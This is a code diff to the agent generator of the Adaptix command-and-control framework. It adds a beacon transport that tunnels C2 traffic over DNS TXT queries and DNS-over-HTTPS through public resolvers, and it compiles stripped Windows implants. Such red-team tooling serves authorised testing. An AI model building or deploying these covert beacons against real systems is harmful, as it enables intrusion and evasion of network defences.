@@ -17,7 +17,7 @@ import (
 	"strings"
 	"time"
 
-	"github.com/Adaptix-Framework/axc2"
+	adaptix "github.com/Adaptix-Framework/axc2"
 )
 
 type GenerateConfig struct {
@@ -35,15 +35,23 @@ type GenerateConfig struct {
 	EndTime            string `json:"end_time"`
 	IsSideloading      bool   `json:"is_sideloading"`
 	SideloadingContent string `json:"sideloading_content"`
+	// DoH-specific fields
+	TransportMode string `json:"transport_mode"` // dns/doh/auto
+	DohMode       string `json:"doh_mode"`       // recursive/direct
+	DnsResolvers  string `json:"dns_resolvers"`  // e.g. "8.8.8.8,1.1.1.1,9.9.9.9"
+	DohUrls       string `json:"doh_urls"`       // e.g. "https://dns.google/dns-query,..."
 }
 
 var (
-	ObjectDir_http = "objects_http"
-	ObjectDir_smb  = "objects_smb"
-	ObjectDir_tcp  = "objects_tcp"
-	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "Boffer", "Commander", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
-	CFlags         = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
-	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
+	ObjectDir_http    = "objects_http"
+	ObjectDir_smb     = "objects_smb"
+	ObjectDir_tcp     = "objects_tcp"
+	ObjectDir_dns     = "objects_dns"
+	ObjectDir_doh     = "objects_doh"
+	ObjectDir_dns_doh = "objects_dns_doh"
+	ObjectFiles       = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "Boffer", "Commander", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
+	CFlags            = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
+	LFlags            = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
 )
 
 func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
@@ -171,6 +179,77 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 		params = append(params, int(lWatermark))
 		params = append(params, kill_date)
 
+	case "doh":
+		// Combined DNS+DoH beacon profile
+		domain, _ := listenerMap["domain"].(string)
+		resolvers := generateConfig.DnsResolvers
+		if resolvers == "" {
+			resolvers = "8.8.8.8,1.1.1.1,9.9.9.9"
+		}
+		qtype := "TXT"
+		doh_urls := generateConfig.DohUrls
+		if doh_urls == "" {
+			doh_urls = "https://cloudflare-dns.com/dns-query,https://dns.google/dns-query,https://dns.quad9.net/dns-query"
+		}
+		user_agent, _ := listenerMap["user_agent"].(string)
+		if user_agent == "" {
+			user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+		}
+		pkt_size_f, _ := listenerMap["pkt_size"].(float64)
+		ttl_f, _ := listenerMap["ttl"].(float64)
+		label_size := 48
+
+		pkt_size := int(pkt_size_f)
+		if pkt_size <= 0 {
+			pkt_size = 4096
+		}
+		ttl := int(ttl_f)
+		if ttl <= 0 {
+			ttl = 5
+		}
+
+		seconds, err := parseDurationToSeconds(generateConfig.Sleep)
+		if err != nil {
+			return nil, err
+		}
+
+		lWatermark, _ := strconv.ParseInt(listenerWM, 16, 64)
+
+		mode := generateConfig.TransportMode
+		if mode == "" {
+			mode = "auto"
+		}
+		dohMode := generateConfig.DohMode
+		if dohMode == "" {
+			dohMode = "recursive"
+		}
+
+		params = append(params, int(agentWatermark))
+		// DNS part
+		params = append(params, domain)
+		params = append(params, resolvers)
+		params = append(params, qtype)
+		params = append(params, pkt_size)
+		params = append(params, label_size)
+		params = append(params, ttl)
+		// DoH part
+		params = append(params, domain)
+		params = append(params, doh_urls)
+		params = append(params, user_agent)
+		params = append(params, pkt_size)
+		params = append(params, label_size)
+		params = append(params, ttl)
+		params = append(params, dohMode)
+		// Mode strings
+		params = append(params, mode)
+		params = append(params, dohMode)
+		// Common tail
+		params = append(params, int(lWatermark))
+		params = append(params, kill_date)
+		params = append(params, working_time)
+		params = append(params, seconds)
+		params = append(params, generateConfig.Jitter)
+
 	default:
 		return nil, errors.New("protocol unknown")
 	}
@@ -228,7 +307,20 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		return nil, "", err
 	}
 
+	// Set arch-specific values first
+	if generateConfig.Arch == "x86" {
+		Compiler = "i686-w64-mingw32-g++"
+		Ext = ".x86.o"
+		Filename = "agent.x86"
+	} else {
+		Compiler = "x86_64-w64-mingw32-g++"
+		Ext = ".x64.o"
+		Filename = "agent.x64"
+	}
+
 	protocol, _ := listenerMap["protocol"].(string)
+	extraObjs := ""
+	extraLibs := ""
 	if protocol == "http" {
 		ObjectDir = ObjectDir_http
 		ConnectorFile = "ConnectorHTTP"
@@ -238,21 +330,16 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	} else if protocol == "bind_tcp" {
 		ObjectDir = ObjectDir_tcp
 		ConnectorFile = "ConnectorTCP"
+	} else if protocol == "doh" {
+		ObjectDir = ObjectDir_doh
+		ConnectorFile = "ConnectorDNS"
+		extraObjs = " " + ObjectDir + "/ConnectorDoH" + Ext + " " + ObjectDir + "/DnsUtils" + Ext + " " + ObjectDir + "/DnsCompression" + Ext + " " + ObjectDir + "/miniz" + Ext
+		extraLibs = " -lwininet -lws2_32"
 	} else {
 		return nil, "", errors.New("protocol unknown")
 	}
 
-	if generateConfig.Arch == "x86" {
-		Compiler = "i686-w64-mingw32-g++"
-		Ext = ".x86.o"
-		stubPath = currentDir + "/" + ObjectDir + "/stub.x86.bin"
-		Filename = "agent.x86"
-	} else {
-		Compiler = "x86_64-w64-mingw32-g++"
-		Ext = ".x64.o"
-		stubPath = currentDir + "/" + ObjectDir + "/stub.x64.bin"
-		Filename = "agent.x64"
-	}
+	stubPath = currentDir + "/" + ObjectDir + "/stub" + Ext[:4] + ".bin"
 
 	svcName := ""
 	for _, char := range generateConfig.SvcName {
@@ -315,7 +402,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		return nil, "", errors.New("unknown file format")
 	}
 
-	cmdBuild := fmt.Sprintf("%s %s %s -o %s", Compiler, lFlags, Files, buildPath)
+	cmdBuild := fmt.Sprintf("%s %s %s%s -o %s%s", Compiler, lFlags, Files, extraObjs, buildPath, extraLibs)
 	runnerCmdBuild := exec.Command("sh", "-c", cmdBuild)
 	runnerCmdBuild.Dir = currentDir
 	runnerCmdBuild.Stdout = &stdout
@@ -323,7 +410,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	err = runnerCmdBuild.Run()
 	if err != nil {
 		_ = os.RemoveAll(tempDir)
-		return nil, "", err
+		return nil, "", errors.New(stderr.String())
 	}
 
 	buildContent, err := os.ReadFile(buildPath)
